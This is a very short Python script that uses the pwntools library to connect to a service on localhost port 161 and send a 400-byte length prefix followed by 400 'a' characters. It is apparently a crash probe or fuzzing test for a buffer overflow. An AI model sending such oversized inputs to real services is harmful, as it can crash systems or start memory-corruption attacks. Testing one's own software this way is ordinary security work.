from pwn import *

s = tubes.remote.remote('localhost',161)

s.send(p32(400)+'a'*400)
